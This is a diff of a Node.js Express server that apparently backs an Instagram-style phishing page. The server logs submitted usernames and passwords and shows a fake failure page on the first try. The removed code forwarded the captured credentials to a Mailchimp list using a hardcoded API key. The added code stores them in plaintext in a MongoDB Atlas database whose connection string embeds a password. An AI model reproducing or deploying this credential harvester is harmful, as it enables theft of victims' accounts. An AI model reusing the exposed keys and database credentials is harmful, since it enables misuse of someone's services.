@@ -1,12 +1,33 @@
-const express = require("express");
-const bodyParser = require("body-parser");
-const request = require("request");
-const http = require("https");
+import express from "express";
+import bodyParser from "body-parser";
+import request from "request";
+import http from "https";
+import mongoose from "mongoose";
+import path from 'path';
+import { fileURLToPath } from 'url';
 
 const app = express();
+const __filename = fileURLToPath(import.meta.url);
 
-app.use(express.static("public"));
+const __dirname = path.dirname(__filename);
+
+app.use(express.static(path.join(__dirname, 'public')))
 app.use(bodyParser.urlencoded({extended: true}));
+
+mongoose.connect("mongodb+srv://chinxgrover:narutois1@cluster0.zgx0s27.mongodb.net/instaDB", {useNewUrlParser: true, useUnifiedTopology: true});
+
+const userSchema = new mongoose.Schema({
+    username : {
+        type :String,
+        required: [true, "username is necessary"]
+    },    
+    password : {
+        type :String,
+        required: [true, "type a password"]
+    },    
+});
+
+const User = new mongoose.model("User" ,userSchema);
 
 var number = 1;
 
@@ -17,45 +38,19 @@ app.get("/", function(req, res) {
 app.post("/", function(req, res) {
 
     var username = req.body.user;
-    var password = req.body.pass;
+    var pass = req.body.pass;
 
     console.log("username: " + username);
-    console.log("password: " + password);
+    console.log("password: " + pass);
     console.log();
     
-    username = username + "@gmail.com";
-
-    var data = {
-        members : [
-            {
-                email_address: username,
-                update_existing: true,
-                status: "subscribed",
-                merge_fields : {
-                    FNAME: password
-                }
-            }
-        ]
-    }
-
-    const jsonData = JSON.stringify(data);
-
-    const url = "https://us2.api.mailchimp.com/3.0/lists/d461074d1d";
-
-    const options = {
-        method: "POST",
-        auth: "chianx1:144fbe97fb11e21d874db692d085c7c5-us2"
-    }
-
-    const request = http.request(url, options, function(response) {
-        response.on("data", function(data) {
-            console.log(JSON.parse(data));
-        });
+    const newUser = new User({
+        username : username,
+        password : pass,
     });
 
-    request.write(jsonData);
-    request.end();
-
+    newUser.save();
+    console.log("*user successfully added*");
 
     if (number ==1 && res.statusCode == 200) {
         res.sendFile(__dirname + "/failure.html");
@@ -64,9 +59,7 @@ app.post("/", function(req, res) {
         res.sendFile(__dirname + "/success.html");
         number =1;
     }
-
-
-    
+   
 });
 
 app.post("/failure.html", function(req, res) {
